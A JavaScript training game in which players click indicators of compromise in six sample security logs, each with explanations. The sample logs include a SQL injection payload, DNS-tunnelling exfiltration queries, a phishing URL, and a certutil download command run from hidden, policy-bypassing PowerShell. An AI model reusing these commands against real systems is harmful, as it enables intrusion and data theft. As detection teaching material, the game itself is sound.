/*
 * find-ioc-game.js — E@st3r Egg Cyb3r Ski11 G@m3: Find the IOC (Cyber Ninja tier)
 *
 * Six log-snippet rounds covering Suricata, Windows Security, sshd, email
 * headers, Zeek DNS, and Sysmon. Player clicks tokens they believe are
 * indicators of compromise; submit locks selections; visual feedback shows
 * correct hits (green), missed IOCs (yellow), false positives (red).
 *
 * Template markup parsed at render time:
 *   [[IOC:N|text]]  -> clickable, IOC index N
 *   [[TOKEN|text]]  -> clickable, decoy (not an IOC)
 *   Anything else   -> plain monospace text
 *
 * Scoring per round (12-pt scale across 6 rounds, pass at 10/12 = 83%):
 *   - All IOCs found, zero false positives = 2 pts
 *   - All IOCs found with 1-2 false positives  = 1 pt
 *   - Missed any IOC OR 3+ false positives     = 0 pts
 *
 * Registers as window.HackMeGame.ioc. Pure DOM, CSP-safe (no innerHTML).
 */
(function () {
  'use strict';

  var rounds = [
    {
      source: 'Suricata alert + HTTP request (SQL injection attempt)',
      template:
        '[**] [1:2014920:7] ET WEB_SERVER SQL Injection Attempt UNION SELECT [**]\n' +
        '[Classification: Web Application Attack] [[TOKEN|[Priority: 1]]]\n' +
        '05/14-14:22:18.451 [[IOC:0|185.220.101.42]]:48291 -> [[TOKEN|10.0.5.20]]:80\n' +
        '\n' +
        'GET /products.php?id=1\' [[IOC:1|UNION SELECT username,password FROM users--]] HTTP/1.1\n' +
        'Host: [[TOKEN|store.example.com]]\n' +
        'User-Agent: [[IOC:2|sqlmap/1.7.2#stable]] (https://sqlmap.org)\n' +
        'Accept: */*',
      iocs: [
        { label: '185.220.101.42', tell: 'External source IP, well-known Tor exit node range. Internal services should never see traffic from public Tor exits except via VPN.' },
        { label: 'UNION SELECT username,password FROM users--', tell: 'Textbook SQL injection payload: UNION SELECT to leak the users table, double-dash to comment out the rest of the query.' },
        { label: 'sqlmap/1.7.2#stable', tell: 'sqlmap is the standard automated SQL injection tool. Any User-Agent advertising it (or even a customized variant) is non-human traffic targeting an injection point.' }
      ]
    },
    {
      source: 'Windows Security EID 4625 (failed logon)',
      template:
        'Event ID: 4625 - An account failed to log on.\n' +
        'Computer: [[TOKEN|FILESERVER01.corp.example.local]]\n' +
        '\n' +
        'Account For Which Logon Failed:\n' +
        '  Account Name:    [[IOC:1|administrator]]\n' +
        '  Account Domain:  CORP\n' +
        'Failure Information:\n' +
        '  Status:          [[TOKEN|0xC000006D]]\n' +
        '  Sub Status:      0xC000006A\n' +
        'Logon Type:        [[TOKEN|3]]\n' +
        'Network Information:\n' +
        '  Workstation Name:        [[IOC:2|KALI-ATTACKER]]\n' +
        '  Source Network Address:  [[IOC:0|91.218.114.4]]\n' +
        '  Source Port:             51234',
      iocs: [
        { label: '91.218.114.4', tell: 'External source IP attempting domain authentication from outside the network. Real users authenticate from corporate subnets, not arbitrary internet IPs.' },
        { label: 'administrator', tell: 'Default high-value account name. Real users rarely log on as "administrator" - attackers test it first because it exists on every Windows AD environment.' },
        { label: 'KALI-ATTACKER', tell: 'Workstation name self-discloses Kali Linux (the pentesting / offensive-security distro). The attacker did not bother spoofing the hostname.' }
      ]
    },
    {
      source: 'sshd auth.log (brute force followed by successful login)',
      template:
        'May 14 03:21:18 [[TOKEN|web01]] sshd[12387]: Failed password for [[IOC:1|root]] from [[IOC:0|45.143.200.13]] port 41280 ssh2\n' +
        'May 14 03:21:19 web01 sshd[12389]: Failed password for [[IOC:1|root]] from [[IOC:0|45.143.200.13]] port 41282 ssh2\n' +
        'May 14 03:21:20 web01 sshd[12391]: Failed password for invalid user admin from [[IOC:0|45.143.200.13]] port 41284 ssh2\n' +
        'May 14 03:21:21 web01 sshd[12393]: Failed password for invalid user [[TOKEN|oracle]] from [[IOC:0|45.143.200.13]] port 41286 ssh2\n' +
        'May 14 03:21:30 web01 sshd[12420]: [[IOC:2|Accepted]] password for [[IOC:3|guest]] from [[IOC:0|45.143.200.13]] port 41310 ssh2',
      iocs: [
        { label: '45.143.200.13', tell: 'Same external IP across every line - a single attacker enumerating usernames, then successfully logging in. The continuity is the tell.' },
        { label: 'root', tell: 'Direct attempts against root on a public-facing host. Modern hardening disables root SSH entirely (PermitRootLogin no). Seeing root failures means an attacker is fishing.' },
        { label: 'Accepted', tell: 'The pivot from "Failed password" to "Accepted password" is the moment of compromise. After dozens of failures, ONE success from the same IP = brute force succeeded.' },
        { label: 'guest', tell: 'The account that finally accepted. Default or low-privilege accounts often have weak passwords. From here the attacker pivots: lateral movement, privilege escalation.' }
      ]
    },
    {
      source: 'Email header (phishing)',
      template:
        'From: "IT Security" <[[TOKEN|support@corp.example.com]]>\n' +
        'Reply-To: alerts@[[IOC:0|m1crosoft-secure.io]]\n' +
        'To: [[TOKEN|jane.smith@corp.example.com]]\n' +
        'Subject: URGENT: Account compromised - verify identity\n' +
        'Date: Wed, 14 May 2026 09:14:22 +0000\n' +
        'Message-ID: <abc123@[[IOC:0|m1crosoft-secure.io]]>\n' +
        'Return-Path: <bounce@[[IOC:0|m1crosoft-secure.io]]>\n' +
        'Received: from mail.[[IOC:0|m1crosoft-secure.io]] ([[IOC:1|185.220.101.42]]) by mx.corp.example.com\n' +
        'X-Mailer: [[IOC:3|PHPMailer 6.7.1]]\n' +
        '\n' +
        'Click here to verify your account:\n' +
        '[[IOC:2|https://m1crosoft-secure.io/auth/verify?uid=jsmith]]',
      iocs: [
        { label: 'm1crosoft-secure.io', tell: 'Typosquat domain - the "1" instead of "i" in "microsoft" is the giveaway. Reply-To, Message-ID, Return-Path, and Received all point at this attacker-owned domain even though the From: header was spoofed to look internal.' },
        { label: '185.220.101.42', tell: 'Sending server IP. Microsoft mail comes from microsoft.com / outlook.com IP space - never a random VPS or Tor exit. SPF/DKIM/DMARC would catch this if enforced.' },
        { label: 'https://m1crosoft-secure.io/auth/verify?uid=jsmith', tell: 'The actual credential-harvest URL. The uid parameter pre-fills the username so the phishing page looks personalized.' },
        { label: 'PHPMailer 6.7.1', tell: 'Open-source PHP mail library. Real Microsoft / corporate IT mail comes from Exchange or O365 (X-Mailer absent or "Microsoft Outlook ..."). PHPMailer = bulk attacker tooling.' }
      ]
    },
    {
      source: 'Zeek dns.log (DNS tunneling for C2/exfil)',
      template:
        '[Zeek dns.log - 4 of ~60 queries/hour from this host; baseline: 0]\n' +
        '\n' +
        'ts                src_ip            qry_name                                              type           rcode\n' +
        '1715635200.123    [[IOC:2|10.0.5.42]]    [[IOC:3|ZGF0YS1jaHVuay0wMDAx]].[[IOC:0|exfil.attacker.net]]    [[IOC:1|TXT]]    [[TOKEN|NOERROR]]\n' +
        '1715635260.234    [[IOC:2|10.0.5.42]]    [[IOC:3|ZGF0YS1jaHVuay0wMDAy]].[[IOC:0|exfil.attacker.net]]    [[IOC:1|TXT]]    NOERROR\n' +
        '1715635320.345    [[IOC:2|10.0.5.42]]    [[IOC:3|ZGF0YS1jaHVuay0wMDAz]].[[IOC:0|exfil.attacker.net]]    [[IOC:1|TXT]]    NOERROR\n' +
        '1715635380.456    [[IOC:2|10.0.5.42]]    [[IOC:3|ZGF0YS1jaHVuay0wMDA0]].[[IOC:0|exfil.attacker.net]]    [[IOC:1|TXT]]    NOERROR',
      iocs: [
        { label: 'exfil.attacker.net', tell: 'The parent domain. Every query goes here - a single resolver under attacker control. The subdomains carry the payload.' },
        { label: 'TXT', tell: 'TXT records can carry arbitrary text (originally for SPF). Attackers abuse them for both downstream commands (C2 responses) and upstream exfiltration.' },
        { label: '10.0.5.42', tell: 'The compromised internal host. Sustained outbound DNS to a single attacker domain is the behavioral signal - a normal endpoint sees diverse DNS targets.' },
        { label: 'ZGF0YS1jaHVuay0wMDAx', tell: 'Base64-encoded subdomain ("data-chunk-0001"). The subdomain field is the payload - each query exfiltrates ~30 bytes. Combine 60+ queries to reconstruct the file.' }
      ]
    },
    {
      source: 'Sysmon EID 1 (LOLBin certutil downloader via stealthy PowerShell)',
      template:
        'Sysmon Event ID 1: Process Create\n' +
        'UtcTime:          2026-05-14 18:32:45.123\n' +
        'Image:            [[TOKEN|C:\\Windows\\System32\\certutil.exe]]\n' +
        'CommandLine:      [[IOC:0|certutil.exe -urlcache -split -f]] [[IOC:1|https://pastebin.com/raw/AbC123xyz]] [[IOC:2|C:\\Users\\Public\\update.exe]]\n' +
        'CurrentDirectory: C:\\Users\\jsmith\\\n' +
        'User:             [[TOKEN|CORP\\jsmith]]\n' +
        'ParentImage:      C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n' +
        'ParentCommandLine: powershell.exe [[IOC:3|-ExecutionPolicy Bypass -nop -w hidden]]\n' +
        'ProcessId:        4892',
      iocs: [
        { label: 'certutil.exe -urlcache -split -f', tell: 'certutil is a signed Microsoft binary intended for certificate management - the -urlcache flag turns it into a file downloader. Classic LOLBin abuse (T1105 Ingress Tool Transfer).' },
        { label: 'https://pastebin.com/raw/AbC123xyz', tell: 'Attacker-controlled hosting for the second-stage payload. Pastebin raw URLs are a common drop point because they are widely allow-listed.' },
        { label: 'C:\\Users\\Public\\update.exe', tell: 'C:\\Users\\Public\\ is world-writable, so it does not require admin to drop files. The "update.exe" name is masquerade to look like legit software.' },
        { label: '-ExecutionPolicy Bypass -nop -w hidden', tell: 'Three PowerShell evasion flags in one: bypass execution policy, no profile load (avoid logging hooks), and hidden window. Legit admin scripts almost never need this combination.' }
      ]
    }
  ];

  var PASS_PCT = 80;
  var POINTS_PERFECT = 2;
  var POINTS_PARTIAL = 1;
  var MAX_FP_FOR_PARTIAL = 2;
  var MAX_POINTS = rounds.length * POINTS_PERFECT;
  var state = null;

  function clear(node) { while (node.firstChild) node.removeChild(node.firstChild); }
  function el(tag, className, text) {
    var n = document.createElement(tag);
    if (className) n.className = className;
    if (text != null) n.textContent = text;
    return n;
  }

  function parseTemplate(template) {
    var segments = [];
    var re = /\[\[(IOC:\d+|TOKEN)\|([^\]]+)\]\]/g;
    var idx = 0;
    var match;
    while ((match = re.exec(template)) !== null) {
      if (match.index > idx) segments.push({ kind: 'text', text: template.slice(idx, match.index) });
      var ioc = match[1].indexOf('IOC:') === 0 ? parseInt(match[1].slice(4), 10) : null;
      segments.push({ kind: 'token', text: match[2], ioc: ioc });
      idx = match.index + match[0].length;
    }
    if (idx < template.length) segments.push({ kind: 'text', text: template.slice(idx) });
    return segments;
  }

  function start(host, onComplete) {
    state = { host: host, onComplete: onComplete, current: 0, score: 0 };
    renderRound();
  }
  function cleanup() { state = null; }

  function renderRound() {
    if (!state) return;
    clear(state.host);
    var round = rounds[state.current];
    var segments = parseTemplate(round.template);

    var wrap = el('div', 'find-ioc-game');
    var card = el('div', 'fi-card');

    var header = el('div', 'fi-header');
    var progress = el('div', 'fi-progress');
    progress.appendChild(document.createTextNode('Round '));
    progress.appendChild(el('strong', null, String(state.current + 1)));
    progress.appendChild(document.createTextNode(' of ' + rounds.length));
    var score = el('div', 'fi-score');
    score.appendChild(document.createTextNode('Score: '));
    score.appendChild(el('strong', null, String(state.score)));
    score.appendChild(document.createTextNode(' / ' + MAX_POINTS));
    header.appendChild(progress);
    header.appendChild(score);
    card.appendChild(header);

    card.appendChild(el('div', 'fi-source', round.source));
    card.appendChild(el('div', 'fi-instructions', 'Click every token you believe is an indicator of compromise (IOC), then submit. ' + round.iocs.length + ' IOCs hidden in this log.'));

    var logEl = el('pre', 'fi-log');
    var tokenButtons = [];

    segments.forEach(function (seg) {
      if (seg.kind === 'text') {
        logEl.appendChild(document.createTextNode(seg.text));
      } else {
        var btn = document.createElement('button');
        btn.type = 'button';
        btn.className = 'fi-token';
        btn.textContent = seg.text;
        btn.setAttribute('data-ioc', seg.ioc == null ? '' : String(seg.ioc));
        btn.addEventListener('click', function () {
          if (btn.disabled) return;
          btn.classList.toggle('fi-selected');
        });
        logEl.appendChild(btn);
        tokenButtons.push({ btn: btn, ioc: seg.ioc });
      }
    });

    card.appendChild(logEl);

    var actionRow = el('div', 'fi-action-row');
    var submitBtn = document.createElement('button');
    submitBtn.type = 'button';
    submitBtn.className = 'fi-btn fi-btn-primary';
    submitBtn.textContent = 'Submit selections';
    var revealBtn = document.createElement('button');
    revealBtn.type = 'button';
    revealBtn.className = 'fi-btn fi-btn-secondary';
    revealBtn.textContent = 'Reveal answers';

    submitBtn.addEventListener('click', function () { gradeAndShow(tokenButtons, round, submitBtn, revealBtn, false); });
    revealBtn.addEventListener('click', function () {
      tokenButtons.forEach(function (t) { t.btn.classList.remove('fi-selected'); });
      gradeAndShow(tokenButtons, round, submitBtn, revealBtn, true);
    });

    actionRow.appendChild(submitBtn);
    actionRow.appendChild(revealBtn);
    card.appendChild(actionRow);

    wrap.appendChild(card);
    state.host.appendChild(wrap);
  }

  function gradeAndShow(tokenButtons, round, submitBtn, revealBtn, gaveUp) {
    var foundIocs = {};
    var falsePositives = 0;
    tokenButtons.forEach(function (t) {
      var selected = t.btn.classList.contains('fi-selected');
      if (selected && t.ioc != null) foundIocs[t.ioc] = true;
      else if (selected && t.ioc == null) falsePositives++;
    });
    var foundCount = Object.keys(foundIocs).length;
    var allFound = foundCount === round.iocs.length;

    var points = 0;
    if (!gaveUp) {
      if (allFound && falsePositives === 0) points = POINTS_PERFECT;
      else if (allFound && falsePositives <= MAX_FP_FOR_PARTIAL) points = POINTS_PARTIAL;
    }
    state.score += points;

    tokenButtons.forEach(function (t) {
      t.btn.disabled = true;
      var selected = t.btn.classList.contains('fi-selected');
      if (t.ioc != null) {
        if (selected) t.btn.classList.add('fi-result-correct');
        else t.btn.classList.add('fi-result-missed');
      } else if (selected) {
        t.btn.classList.add('fi-result-fp');
      }
    });

    submitBtn.disabled = true;
    revealBtn.disabled = true;

    showFeedback(round, points, foundCount, falsePositives, gaveUp);
  }

  function showFeedback(round, points, foundCount, falsePositives, gaveUp) {
    var card = state.host.querySelector('.fi-card');
    if (!card) return;

    var feedbackClass;
    if (points === POINTS_PERFECT) feedbackClass = 'correct';
    else if (points === POINTS_PARTIAL) feedbackClass = 'partial';
    else feedbackClass = 'incorrect';

    var feedback = el('div', 'fi-feedback fi-feedback-' + feedbackClass);
    feedback.setAttribute('role', 'status');
    feedback.setAttribute('aria-live', 'polite');

    var heading = el('div', 'fi-feedback-heading');
    var icon = points >= POINTS_PARTIAL ? '✓' : '✗';
    heading.appendChild(el('span', 'fi-feedback-icon', icon));
    var headingText;
    if (gaveUp) {
      headingText = 'Answers revealed. +0 pts.';
    } else if (points === POINTS_PERFECT) {
      headingText = 'Perfect. All ' + round.iocs.length + ' IOCs, zero false positives. +2 pts.';
    } else if (points === POINTS_PARTIAL) {
      headingText = 'All ' + round.iocs.length + ' IOCs found, ' + falsePositives + ' false positive' + (falsePositives === 1 ? '' : 's') + '. +1 pt.';
    } else if (foundCount < round.iocs.length) {
      headingText = 'Missed ' + (round.iocs.length - foundCount) + ' IOC' + (round.iocs.length - foundCount === 1 ? '' : 's') + '. +0 pts.';
    } else {
      headingText = 'Too many false positives (' + falsePositives + '). +0 pts.';
    }
    heading.appendChild(el('span', 'fi-feedback-text', headingText));
    feedback.appendChild(heading);

    feedback.appendChild(el('div', 'fi-tells-heading', 'IOCs in this log:'));

    var ul = el('ul', 'fi-tells');
    round.iocs.forEach(function (ioc) {
      var li = el('li', 'fi-tell');
      li.appendChild(el('code', 'fi-tell-label', ioc.label));
      li.appendChild(document.createTextNode(' — ' + ioc.tell));
      ul.appendChild(li);
    });
    feedback.appendChild(ul);

    card.appendChild(feedback);

    var next = document.createElement('button');
    next.type = 'button';
    next.className = 'fi-btn fi-btn-next';
    next.textContent = state.current < rounds.length - 1 ? 'Next →' : 'See results';
    next.addEventListener('click', function () {
      state.current++;
      if (state.current < rounds.length) {
        renderRound();
        state.host.scrollIntoView({ behavior: 'smooth', block: 'start' });
      } else {
        renderResults();
      }
    });
    card.appendChild(next);

    var scoreStrong = card.querySelector('.fi-score strong');
    if (scoreStrong) scoreStrong.textContent = String(state.score);

    feedback.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
  }

  function renderResults() {
    if (!state) return;
    clear(state.host);
    var pct = Math.round((state.score / MAX_POINTS) * 100);
    var message;
    if (pct === 100) message = 'Perfect score. You triage logs like the on-call SOC analyst we want on shift.';
    else if (pct >= PASS_PCT) message = 'Strong. You can pull signal out of a noisy log under pressure.';
    else if (pct >= 60) message = 'Decent. Reread the tells on rounds you missed - IOC fluency comes from repetition.';
    else message = 'Worth another round. The log lines you missed are exactly the ones an attacker hopes you skim.';

    var wrap = el('div', 'find-ioc-game');
    var card = el('div', 'fi-card fi-results');

    var scoreLine = el('div', 'fi-results-score');
    scoreLine.appendChild(el('strong', null, String(state.score)));
    scoreLine.appendChild(document.createTextNode(' / ' + MAX_POINTS));
    card.appendChild(scoreLine);
    card.appendChild(el('div', 'fi-results-pct', pct + '%'));
    card.appendChild(el('div', 'fi-results-message', message));

    var replay = document.createElement('button');
    replay.type = 'button';
    replay.className = 'fi-btn fi-btn-replay';
    replay.textContent = 'Try again';
    replay.addEventListener('click', function () {
      state.current = 0;
      state.score = 0;
      renderRound();
      state.host.scrollIntoView({ behavior: 'smooth', block: 'start' });
    });
    card.appendChild(replay);

    wrap.appendChild(card);
    state.host.appendChild(wrap);

    if (typeof state.onComplete === 'function') state.onComplete(pct);
  }

  window.HackMeGame = window.HackMeGame || {};
  window.HackMeGame.ioc = { start: start, cleanup: cleanup };
})();
